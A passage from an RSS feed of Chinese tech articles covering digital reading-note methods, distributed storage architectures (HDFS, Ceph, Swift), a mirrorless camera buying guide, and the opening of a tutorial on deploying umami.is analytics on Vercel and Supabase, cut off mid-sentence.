便签读书法，因为它可以直接插入表格，而在表格中也可以随意添加图片。</p>\n<p>具体操作：</p>\n<ul>\n<li>R：摘抄下阅读片段</li>\n<li>I：用自己的表达将知识点重述</li>\n<li>A1：描述自己的相关经验</li>\n<li>A2：以后如何应用</li>\n</ul>\n<h3>其他记录</h3>\n<h4><strong>记录读书进度</strong></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sflb34tcuopj7s7g.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sftb34tcvciqaaj0.jpeg\"></figure><p>由于我平日里经常在一段规划好的阅读时间里同时读好几本书，所以我会记录下正在读的书有哪些，不然很多书读着读着就会消失不见。同样，我也会记录下读过的书。</p>\n<p>记录在读和读过的书籍都属于回望式的记录。两种方式都是把正在读的书全部写下来，读完了，就打个勾或者标注一下。这样一个记录可以建立一个个锚点，当我需要回看的时候，也能马上知道自己曾经阅读过什么书，还有哪些书没有看完。当我们读过很多书之后，看着熙来攘往的读书记录表，也会有一种莫大的成就感，鼓励我们继续坚持阅读。</p>\n<p>我记录读书的进度很简单，先是随时手写已经读完的书在一个小本子上，然后在每一年的最后一天，用 Excel 表格进行最后整理和记录。</p>\n<h4><strong>记录读书计划，建立自己的知识系统</strong></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sg5b34tcuopj7s80.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sgdb34tcu4buqvsg.jpeg\"></figure><p>作为一个热爱读书的人，我自己还会进行前瞻式的记录，也就是提前制定自己的读书计划。特别是当我需要对一个领域进行钻研的时候，我会设立一个为期 1-3 个月的读书计划，然后进行主题阅读。主题阅读无外乎就是找到适合的书目，将书单排列出来，一本一本的去读。</p>\n<p>我习惯用 Excel 表格制定一个全方面的主题阅读计划。每次当我遇到新的书目，我都可以快速地将新的书目添加进去表格内，实时更新我的主题阅读情况。</p>\n<h3>总结</h3>\n<p>阅读和学习往往是探索真理和形成三观的最有利途径。人的记忆力是有限的，读书笔记无疑可以使自己对读过的书有更进一步的印象和理解。我们阅读的每一本书都有自己的中心重点，而读书笔记可以让我们记录下这些对我们有用的知识和思想。</p>\n<p>上面我提到的每种电子读书笔记法，都非常强调写出自己对书中观点或者知识的思考和应用，真正消化书中的知识，把书里的信息变为自己受益终身的精神财富，这才是我们做读书笔记的本质。</p>\n<p>以上就是我平日里用得最多的读书笔记方法，望我的笔记方法能带给大家有价值的参考，祝大家早日把读过的书籍都转化成脑里的知识。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68535"},{"title":"一篇文章讲透分布式存储","date":"2021-09-14 08:12:27","description":"\n<p>分布式存储是相对于集中式存储来说的，在介绍分布式存储之前，我们先看看什么是集中式存储。不久之前，企业级的存储设备都是集中式存储。所谓集中式存储，从概念上可以看出来是具有集中性的，也就是整个存储是集中在一个系统中的。但集中式存储并不是一个单独的设备，是集中在一套系统当中的多个设备。以EMX公司的存储为例，整个存储系统可能需要几个机柜来存放。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-cc4dcca29b636eeb8e211ba91656cd2a_b.jpg\" data-size=\"normal\" data-rawwidth=\"451\" data-rawheight=\"446\" class=\"origin_image zh-lightbox-thumb\" width=\"451\" data-original=\"https://pic3.zhimg.com/v2-cc4dcca29b636eeb8e211ba91656cd2a_r.jpg\"><figcaption>图1 集中式存储物理示意图</figcaption></figure><h2>集中式存储基本架构</h2>\n<p>在这个存储系统中包含很多组件，除了核心的机头（控制器）、磁盘阵列（JBOD）和交换机等设备外，还有管理设备等辅助设备。如图2是一个集中式存储的基本逻辑示意图。<br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1758fee2dcb1e4cf2fcf2c090f53805d_b.jpg\" data-size=\"normal\" data-rawwidth=\"382\" data-rawheight=\"748\" class=\"content_image\" width=\"382\"><figcaption>图2 集中式存储逻辑示意图</figcaption></figure><p>在集中式存储中通常包含一个机头，这个是存储系统中最为核心的部件。通常在机头中有包含两个控制器，这两个控制器实现互备的作用，避免硬件故障导致整个存储系统的不可用。在该机头中通常包含前端端口和后端端口，前端端口用户为服务器提供存储服务，而后端端口用于扩充存储系统的容量。通过后端端口机头可以连接更多的存储设备，从而形成一个非常大的存储资源池。<br>机头中是整个存储系统的核心部件，整个存储系统的高级功能都在其中实现。控制器中的软件实现对磁盘的管理，将磁盘抽象化为存储资源池，然后划分为LUN提供给服务器使用。<b>这里的LUN其实就是在服务器上看到的磁盘</b>。当然，一些集中式存储本身也是文件服务器，可以为服务器提供共享文件服务。无论如何，从上面我们可以看出集中式存储<b>最大的特点是有一个统一的入口，所有数据都要经过这个入口</b>，这个入口就是存储系统的机头。<br>分布式存储是一个大的概念，其包含的种类繁多，除了传统意义上的分布式文件系统、分布式块存储和分布式对象存储外，还包括分布式数据库和分布式缓存等。本文局限在分布式文件系统等传统意义上的存储架构，对于数据库等不做介绍。</p>\n<h2>中间控制节点架构（HDFS）</h2>\n<p>分布式存储最早是由谷歌提出的，其目的是通过廉价的服务器来提供使用与大规模，高并发场景下的Web访问问题。如图3是谷歌分布式存储（HDFS）的简化的模型。在该系统的整个架构中将服务器分为两种类型，一种名为namenode，这种类型的节点负责管理管理数据（元数据），另外一种名为datanode，这种类型的服务器负责实际数据的管理。<br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b300fbf39b880c0ac50b7212384bf345_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"304\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic2.zhimg.com/v2-b300fbf39b880c0ac50b7212384bf345_r.jpg\"><figcaption>图3 HDFS简化架构图示意图</figcaption></figure><p>上图分布式存储中，如果客户端需要从某个文件读取数据，首先从namenode获取该文件的位置（具体在哪个datanode），然后从该位置获取具体的数据。在该架构中namenode通常是主备部署，而datanode则是由大量节点构成一个集群。由于元数据的访问频度和访问量相对数据都要小很多，因此namenode通常不会成为性能瓶颈，而datanode集群可以分散客户端的请求。因此，通过这种分布式存储架构可以通过横向扩展datanode的数量来增加承载能力，也即实现了动态横向扩展的能力。</p>\n<h2>完全无中心架构---计算模式（Ceph）</h2>\n<p>如图是Ceph存储系统的架构，在该架构中与HDFS不同的地方在于该架构中没有中心节点。客户端是通过一个设备映射关系<b>计算出来</b>其写入数据的位置，这样客户端可以直接与存储节点通信，从而避免中心节点的性能瓶颈。<br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-c55a37c3a14c92061c014f578090bef5_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"310\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic2.zhimg.com/v2-c55a37c3a14c92061c014f578090bef5_r.jpg\"><figcaption>图4 Ceph无中心架构</figcaption></figure><p>在Ceph存储系统架构中核心组件有Mon服务、OSD服务和MDS服务等。对于块存储类型只需要Mon服务、OSD服务和客户端的软件即可。其中Mon服务用于维护存储系统的硬件逻辑关系，主要是服务器和硬盘等在线信息。Mon服务通过集群的方式保证其服务的可用性。OSD服务用于实现对磁盘的管理，实现真正的数据读写，通常一个磁盘对应一个OSD服务。<br>客户端访问存储的大致流程是，客户端在启动后会首先从Mon服务拉取存储资源布局信息，然后根据该布局信息和写入数据的名称等信息计算出期望数据的位置（包含具体的物理服务器信息和磁盘信息），然后该位置信息直接通信，读取或者写入数据。</p>\n<h2>\n<br>完全无中心架构---一致性哈希（Swift）</h2>\n<p>与Ceph的通过计算方式获得数据位置的方式不同，另外一种方式是通过一致性哈希的方式获得数据位置。一致性哈希的方式就是将设备做成一个哈希环，然后根据数据名称计算出的哈希值映射到哈希环的某个位置，从而实现数据的定位。<br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b4717d1fc9119c524bba4cc8f617ebc5_b.jpg\" data-size=\"normal\" data-rawwidth=\"539\" data-rawheight=\"328\" class=\"origin_image zh-lightbox-thumb\" width=\"539\" data-original=\"https://pic2.zhimg.com/v2-b4717d1fc9119c524bba4cc8f617ebc5_r.jpg\"><figcaption>图5 一致性哈希原理</figcaption></figure><p>如图5是一致性哈希的基本原理，为了绘制简单，本文以一个服务器上的一个磁盘为例进行介绍。为了保证数据分配的均匀性及出现设备故障时数据迁移的均匀性，一致性哈希将磁盘划分为比较多的虚拟分区，每个虚拟分区是哈希环上的一个节点。整个环是一个从0到32位最大值的一个区间，并且首尾相接。当计算出数据（或者数据名称）的哈希值后，必然落到哈希环的某个区间，然后以顺时针，必然能够找到一个节点。那么，这个节点就是存储数据的位置。<br>Swift存储的整个数据定位算法就是基于上述一致性哈希实现的。在Swift对象存储中，通过账户名/容器名/对象名三个名称组成一个位置的标识，通过该唯一标识可以计算出一个整型数来。而在存储设备方面，Swift构建一个虚拟分区表，表的大小在创建集群是确定（通常为几十万），这个表其实就是一个数组。这样，根据上面计算的整数值，以及这个数组，通过一致性哈希算法就可以确定该整数在数组的位置。而数组中的每项内容是数据3个副本（也可以是其它副本数量）的设备信息（包含服务器和磁盘等信息）。也就是经过上述计算，可以确定一个数据存储的具体位置。这样，Swift就可以将请求重新定向到该设备进行处理。<br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2de06549f0fc4568c8d908b1ee9cf6cb_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"257\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic4.zhimg.com/v2-2de06549f0fc4568c8d908b1ee9cf6cb_r.jpg\"><figcaption>图6 Swift数据定位示意图</figcaption></figure><p>上述计算过程是在一个名为Proxy的服务中进行的，该服务可以集群化部署。因此可以分摊请求的负载，不会成为性能瓶颈。<br>本文介绍了3中最为通用的分布式存储架构及存储形式。其它存储架构也基本上基于上述架构，并没有太大的变化。因此，理解上述架构后，对于理解其它分布式存储会有很大的帮助。由于篇幅问题，本文介绍的不是十分详细，后续本号会更加详细的介绍每种架构的细节。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhang-shu-zhu-69?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">itworld123</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/55964292?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"从原理出发，寻找适合你的那一部——无反相机选购指南","date":"2021-09-14 08:00:00","description":"\n<p>随着科技的发展，相机的自动化和电子化会趋向于：进一步的降低拍摄难度、优化拍摄体验，提升拍摄成功率。在如今短视频横行，人人都是创作者的年代，就相机行业来讲，随着 5G 和科技的进一步发展，产出高质量的照片和视频的重要性愈发显现。而现在，越来越多的年轻人在购买相机时选择无反相机。</p>\n<p>在 2020 年，根据中关村的相机出货量报告，无反相机的销量已经超越单反，越来越多的厂商在投入研发无反相机。</p>\n<p><strong>无反相机，正在替代单反相机成为主流。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t55b34tdhtodsqdg.jpeg\"></figure><p> </p>\n<h2>到底什么是无反相机</h2>\n<p>无反相机的全称是无反光镜相机，与单反相机<sup class=\"ss-footnote\" href=\"\" title=\"单镜头单反光镜相机\" footnote-id=\"1\">1</sup>相比，无反相机减少了单反相机中的反光板，并将<strong>五棱镜</strong>替换为了<strong>电子取景器</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t55b34tdhj3i1atg.png\"><figcaption>无反相机将对焦等固件全部整合在 cmos 上面</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t5db34tdhopdm340.png\"></figure><p>忽略我的灵魂画作，<strong>大多数无反相机的结构就是这么简单，没有反光镜，没有五棱镜。</strong>而取消了实心的五棱镜和反光镜机械结构，无反相机通常体积更小、重量更轻、拍照更安静。</p>\n<p>那么为什么传统单反需要反光板和五棱镜呢？</p>\n<h2>传统单反相机的工作方式</h2>\n<p>这个故事要从发明照相机以前开始说起。</p>\n<p>早在 18 世纪，许多艺术家已经在用一种被称为 <a href=\"https://en.wikipedia.org/wiki/Camera_obscura\" target=\"_blank\">暗箱相机</a><sup class=\"ss-footnote\" href=\"\" title=\"camera obscura\" footnote-id=\"2\">2</sup> 的设备进行绘图的辅助，暗箱相机长这个样子。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t5lb34tdhopdm34g.jpeg\"><figcaption>暗箱相机</figcaption></figure><p>图中的 M 为一块反光板，就是一块用来反射光的镜子，景物通过 B 处进入反光板，在暗箱上方的毛玻璃处成一个<strong>左右颠倒，上下不变</strong>的像，因为缺少合适的记录图像的介质，这时的暗箱还不能「拍摄照片」。</p>\n<p>200 年后的腰平式取景单反相机，与 18 世纪的暗箱成像原理一模一样，只不过为了将景物记录在胶片上，在创作者完成构图后，按下快门键，这时相机会抬起这片<strong>反光板</strong>，将光记录在底片上，底片经过化学处理后，产生了影像呈现给大家。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t5tb34tdhtodsqe0.jpeg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t65b34tdhn8pbkl0.png\"></figure><p>这种相机的成像依然为<strong>左右相反</strong>，在此基础上，我们现在常见的单反相机在这个基础上增加了一个五棱镜，光线会在五棱镜内多两次反射，以此来矫正图像的<strong>左右相反</strong>，成正常的<strong>左右不变，上下不变</strong>的像，真正的成为所见即所得。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t6db34tdhtodsqeg.jpeg\"><figcaption>这时就要祭出我的玛米亚 RB67 了</figcaption></figure><p><strong>讲了这么多，那么反光镜到底起了什么作用？</strong></p>\n<p>当我们需要将景物记录在胶片或者 CMOS 上的时候，按下快门之后如单反这类的机器会在极短的时间内<strong>升起反光板</strong>，让光线照射在底片上，最终成像。</p>\n<p><strong>升起反光板</strong>这一动作会<strong>造成机器的震动</strong>，可能会导致图片模糊，失去好镜头带来的清晰度和锐度，尤其是玛米亚 RB67 这样的拥有巨大反光板的机器，就算用了快门线，它的机震仍然很严重，机震当然对许多追求极致的图片清晰度和锐度的摄影家造成了很大的困扰。</p>\n<p>讲一个小插曲。</p>\n<p>早在一百多年前，人们就发明双反相机<sup class=\"ss-footnote\" href=\"\" title=\"双反光镜相机\" footnote-id=\"3\">3</sup>，它的两个镜头，其中一个装有固定的反光板作为取景镜头，在按下快门后，另一个镜头会直接开启快门帘记录景象，这样可以最大程度的减小反光板机震对图片造成的影响。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t6lb34tdhn8pbklg.jpeg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t6lb34tdhn8pbkm0.jpeg\"><figcaption>双反相机 婴儿睡眠般的快门声音</figcaption></figure><h2>无反相机的优势</h2>\n<h3>连拍速度更快</h3>\n<p>承接上文，讲了这么多反光板的问题，可能有人会说许多单反都有反光板预升功能，也可以最大程度上减少机震。但是在拍摄时，由于反光板的限制，单反如果要完成对焦，需要<strong>副反光板</strong>介入，因此<strong>对焦时反光板必须处于落下状态</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t6tb34tdhj3i1au0.jpeg\"><figcaption>反光板上升后没有光线进入它的对焦模块</figcaption></figure><p>在高速连拍时，反光板反复升落会产生极大的震动，反光板的机械结构也注定反光板升降这个动作有一个极限，不能以非常快的速度运动，因此目前来看，12-16 张/秒的连续追焦拍摄速度，或许不是单反对焦系统极限，但是是目前反光板结构的极限。在这一点上，无反相机具有与生俱来的优势，理论上只要 CMOS 的电信号储存和处理性能加快，无反可以做到几百张每秒的连拍，就好比拍视频一样。</p>\n<p>除了高速连拍之外，相机性能体现最明显的、各大厂商生产无反的兵家必争之地就是对焦了。</p>\n<p>而无反相机在近些年来因为研发投入的力度加大，也为无反用户带来了对焦方面的不断的技术革新。</p>\n<h3>自动对焦技术革新</h3>\n<p>新的取景方式带来的最大变革就是无反相机需要将对焦、测光等等都整合在传感器上。</p>\n<p>本文主要讲两种基本的自动对焦原理，第一个为常见于传统单反相机的相位检测自动对焦，第二个为常见于无反相机基本的对比度自动对焦。</p>\n<h4>相位检测自动对焦</h4>\n<p>相位对焦的原理是在感光元件上<strong>预留出一些遮蔽像素点</strong>，专门用来进行相位检测，通过像素之间的距离及其变化等来决定对焦的偏移值从而实现准确对焦。</p>\n<p>相位检测自动对焦的优势在于它速度快，拍摄跟踪运动物体时能准确对焦，而且只需要计算一次就完成对焦，对焦速度极快，并且降低处理器计算负担。</p>\n<p>缺点是在弱光环境下容易对不上焦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t75b34tdhn8pbkmg.png\"><figcaption>相位对焦</figcaption></figure><h4>对比度检测自动对焦（反差对焦）</h4>\n<p>顾名思义就是通过镜头中镜组的前后移动来找到高对比度的点，达到对焦的目的。</p>\n<p>反差对焦的缺点就是耗时太长，直观的感受就是对焦慢。</p>\n<p>镜头从开始对焦到最后合焦完毕一直不停移动，「走过站」以后的回退过程更是让对焦行程增大，反映给用户的就是对焦速度较慢。</p>\n<p>以拍摄一枚硬币为例，最开始画面是虚焦的状态，随后镜头移动，人们可以看到屏幕中的硬币逐渐清晰起来。直到某一个位置，也就是合焦状态硬币最为清晰，但摄像头模组自身是意识不到此时已经合焦完毕的，镜头会继续移动，此时人们会看到硬币又变得模糊。这时摄像头模组才意识到镜头「走过站了」，于是回退至刚才清晰的焦点位置，这样一次对焦就完成了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t7db34tdhj3i1aug.png\"></figure><p>但是经过这几年无反相机的高速发展，目前多数无反相机已经用了<strong>快速混合对焦系统</strong>，也就是<strong>相位检测对焦</strong>和<strong>对比度对焦系统</strong>的结合体，可能 2010 年以前高速对焦还是单反的天下，但是在如今大部分情况下它的对焦能力已经持平更甚至超越了单反，在对焦方面，已经没有什么好怕的了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t7lb34tdhopdm350.jpeg\"><figcaption>A7M3 的 693 的相位对焦点</figcaption></figure><p>比如索尼 A7M3 使用了与 A9 相同的 693 个相位对焦点，对焦点覆盖范围也同为 93%，而反差对焦点的数量由 A9 的 25 个升级到了 425 个。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t7tb34tdhtodsqf0.jpeg\"><figcaption>A7M3 的425个反差对焦点</figcaption></figure><p>无反相机对焦点数的影响主要有三点:</p>\n<ol>\n<li>对焦点越多对焦精度越高。</li>\n<li>对焦点越多，追焦能力越强。</li>\n<li>对焦点越多，意味着相机能支持更大光圈的镜头。</li>\n</ol>\n<h3>手动镜头对焦辅助</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t7tb34tdhn8pbkn0.jpeg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t85b34tdhtodsqfg.jpeg\"><figcaption>两张都失焦的图片</figcaption></figure><p>如果买了相机之后想玩<strong>手动镜头</strong>，最好的购买推荐还是购买无反相机，无反相机有<strong>峰值对焦系统</strong>，焦点越重合，显示屏中的黄色斑点就会越多，用了索尼大法之后，和用单反的小伙伴出门玩手动镜头，我的对焦永远比别人快。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t8db34tdhtodsqg0.jpeg\"><figcaption>峰值对焦示意图</figcaption></figure><h3>更加直观的拍照流程</h3>\n<p>相对于单反相机来讲，单反相机的取景器为所见即所得，在调整相关参数的时候，单反的取景器是无法实时显示调整后的结果，对单反来讲，只有按下快门后才能观察这张图片的曝光和主体是不是自己想要的效果。</p>\n<p>为什么许多摄影专业的老师不让学生买无反相机作为自己的第一台相机？</p>\n<p>恰恰就是因为无反太方便了，简化了学习摄影的许多步骤，对于在光线变化较大或大光比环境下，无反会直接提供调整参数后的实时预览，比如主体曝光的明暗等等。</p>\n<p>相较之下，单反按下快门后才能显示自己这组参数的结果，有可能这时就错过了摄影的决定性瞬间。</p>\n<p>这样的便利对于非摄影爱好者或者摄影专业的人可以说是提供了极大的便利，很多情况下可以避免使用后期软件进行调整，直出出片率还是很高的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t8lb34tdhj3i1av0.png\"><figcaption>无调整直出</figcaption></figure><p>而现在无反相机的取景器系统在向<strong>高像素</strong>、<strong>零延迟</strong>方向前进，比如前阵子出的索尼 A1，它的取景器 944 万像素，每秒 240 帧的刷新率，我相信在不久的将来，高像素低延迟取景器会应用到更加平民化的相机上。</p>\n<h3>视频性能</h3>\n<p>相信大多数人购买无反都是冲着它的视频性能去的，单反相机的反光镜、光学取景器实际上在拍摄视频的时候作用不大，而无反相机取消了这些机械系统，它的重量更轻，更适合用来拍视频。</p>\n<p>因为相机的手持防抖能力有限，如今云台稳定器已经变成拍摄自媒体视频的标配，而同性能情况下越轻的相机，对选购云台来讲方便了许多。加上镜头动辄重量五斤半的单反，在购买云台的时候就要去甄别云台的承重能力是否足够，轴距够不够大能不能把单反放进去之类的问题，通常承重越大的云台就越贵，而对于无反来讲可能很便宜的入门级云台，像如影 sc、智云 Weebills 等就轻松搞定了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t8tb34tdhn8pbkng.jpeg\"><figcaption>带稳定器的无反在多数情况下会显得很专业</figcaption></figure><h2>可能是无反相机唯一的缺点</h2>\n<p>越电子化的产品，它耗电的速度也就越快。</p>\n<p>在单反上一块电池也许能支撑拍摄三千张照片，无反相比单反来说减少了机械部件，增加了许多电子部件，一块电池只能支撑四百张左右，用无反出门拍照，随身携带多块电池简直就是家常便饭，出门街拍还好，在春夏秋三个季节，一块电池基本可以支撑一个小时到两个小时。</p>\n<p>但是在冬天，因为温度低造成驱动防抖，镜头电机等等的相关电子元件所需电量的增大，一块电池突然暴毙的情况时常出现，冬天出门约拍还好，带两块电池也足够支撑两三个小时，但是如果出门拍风光，检查摄影包里面没带四五块电池是真的不敢出门拍延时。</p>\n<h2>附加说明项：画幅的影响</h2>\n<p>首先画幅按从小到大的顺序排列，可以分为 1/3 英寸、1/2.3 英寸、1 英寸、M4/3（4/3英寸）画幅、APS-C（半/残）画幅、全画幅、中画幅以及大画幅。</p>\n<p>在像素数相同的条件下，更大的传感器能够获得更充足的感光量，在实际成像中有着更好的画面质感，同时在暗光拍摄时有着更加出色的噪点抑制能力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c500t95b34tdhj3i1avg.png\"></figure><p>如果只是日常街拍旅拍记录生活，顺带那么一点点的、专业性的需求，比如拍拍暗光人像，或者有时拍拍银河等等，最好的选择是 APS-C 画幅。APS-C 画幅的机型一般来讲都比较小巧，重量很轻颜值很高，比如尼康最近推出的复古相机 Z-fc。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c500t95b34tdhj3i1b00.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c500t9db34tdhj3i1b0g.jpeg\" alt=\"\"></figure><p> </p>\n<p>如果对暗光环境拍摄比较有需求，比如说需要经常拍摄夜间、暗光人像，拍摄银河、荧光海等等，这时上全画幅就比较重要了，这种就是说，半画幅能拍，但只能拍一点点的情况。</p>\n<p>我觉得不会有人第一台相机就入中大画幅数码吧……这里对于中大画幅就不做过多描述了。</p>\n<h2>结尾预告</h2>\n<p>这一期文章介绍完无反的基本原理和参数、价格之后，下一期文章会更详细的讲一讲各个品牌的相机的黑科技和过人之处，在操控性和使用性上会给拍摄者带来怎样的便利以及，持有和使用这些相机的真正感受，展示一些玩机的有趣操作，并且做出一些最优性价比的推荐。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68761"},{"title":"个人网站 / 博客必备，零成本、低门槛创建专属数据分析工具：umami.is","date":"2021-09-14 06:29:15","description":"\n<p><a href=\"https://analytics.google.com/\" target=\"_blank\">Google Analytics</a> 应该是当今互联网使用最广泛的网站流量分析服务。通过在网页中嵌入追踪代码，Google Analytics 能够帮我们收集网站的流量来源，同时自动分析跳出率、转化率等核心指标。但是对于大部分中小型站点而言，接入 Google Analytics 并不是最理想的选择，因为它太复杂了，同时国内访问也不太方便。</p>\n<p><a href=\"https://umami.is/\" target=\"_blank\">umami.is</a> 则可以看作是 Google Analytics 的精简版解决方案，它完全免费且开源，非常适合中小站点的网络流量统计分析。相对于复杂的 Google Analytics，umami.is 的界面也更加简洁，只关注于核心指标，并方便分享出去。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/81cd472c5fd06e5fe82847fd49180762\"><figcaption>umami 示例页面</figcaption></figure><p>作为一款开源解决方案，umami.is 并不提供官方的托管服务，而是需要自行部署。提到部署，你可能想到需要使用自己的服务器或租用云主机。不用担心，接下来我将会介绍利用互联网上现成的无服务器解决方案，<strong>零成本、零门槛部署可靠的 umami.is 服务</strong>。</p>\n<h2>前期准备</h2>\n<p>Serverless 无服务器计算架构近年来逐渐火热，这里的无服务器并不意味着无需服务器参与计算，而是指开发者不必过多关心底层服务器的状态、性能、资源等。因为这一切由云服务商提供，并动态管理机器资源的分配。所以为了达到零成本部署的目标，我们需要选择一些免费可靠的 Serverless 服务<strong>。</strong></p>\n<p>根据 <a href=\"https://github.com/mikecao/umami\" target=\"_blank\">umami.is 官方文档</a> 的说明，其服务需要运行在 Node.js 环境中，且需要对接到 MySQL 或者 PostgreSQL 数据库。所以，接下来我们会使用到免费可靠的 <a href=\"https://vercel.com/\" target=\"_blank\">Vercel</a> 静态站点托管服务，以及同样免费可靠的 PostgreSQL 数据库服务商 <a href=\"https://supabase.io/\" target=\"_blank\">Supabase</a>。</p>\n<p>那么正式开始之前，你需要做的<strong>第一件事是 </strong><a href=\"https://github.com/\" target=\"_blank\"><strong>注册一个 GitHub 帐号</strong></a>。为什么注册 GitHub 呢？因为我们后续要克隆 umami.is 主仓库代码，同时通过 GitHub 帐号直接登录 Vercel 和 Supabase，从而不需要额外再注册相关平台了。</p>\n<p>注册好 GitHub 帐号之后，你需要完成 3 个步骤：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/2a9ea7091ba8e5edd329f8257058e609\"><figcaption>Fork 代码仓库并登录到 Vercel 和 Supabase</figcaption></figure><ol>\n<li>访问 <a href=\"https://github.com/mikecao/umami\" target=\"_blank\">umami.is 代码仓库</a>，点击右上方 Fork 到自己的帐号。</li>\n<li>访问 <a href=\"https://vercel.com/login\" target=\"_blank\">Vercel 注册页面</a>，点击使用 GitHub 登录到 Vercel。</li>\n<li>访问 <a href=\"https://app.supabase.io/api/login\" target=\"_blank\">Supabase 注册页面</a>，点击使用 GitHub 登录到 Supabase。</li>\n</ol>\n<p>至此，准备工作大功告成，是不是非常简单。</p>\n<h2>创建数据库</h2>\n<p>我们需要先在 Supabase 的主界面中找到 <strong>New Project</strong> 按钮创建一个新的数据库。名字可以使用 <code>umami</code>，然后<strong>设置一个自己记得住的数据库密码</strong>。下方的 Region 区域选择 <strong>Northeast Asia（Tokyo）</strong>东京区域。Supabase 本身使用了 AWS 云服务，东京区域在大陆地区的访问速度还是比较理想的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/0d662671cad5373815bcb46c5a538361\"><figcaption>创建自己的 umami 数据库</figcaption></figure><p>创建好之后，等待数据库初始化完成。接下来，我们需要向数据库中写入 umami.is 所需的基础数据结构。打开 <a href=\"https://github.com/mikecao/umami/tree/master/sql\" target=\"_blank\">umami.is 代码仓库</a>，找到其预先提供的 PostgreSQL 初始化 SQL 语句 <a href=\"https://github.com/mikecao/umami/blob/master/sql/schema.postgresql.sql\" target=\"_blank\"><code>schema.postgresql.sql</code></a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/091d1d12bfdf2424522cff89a3f7acf7\"><figcaption>PostgreSQL 初始化 SQL 语句</figcaption></figure><p>接下来，我们回到初始化完成的 Supabase 数据库的设置页面，找到左侧的 SQL 选项，选中默认的 Query-1 查询面板。然后，完整复制上方 <a href=\"https://github.com/mikecao/umami/blob/master/sql/schema.postgresql.sql\" target=\"_blank\"><code>schema.postgresql.sql</code></a> 文件中的 SQL 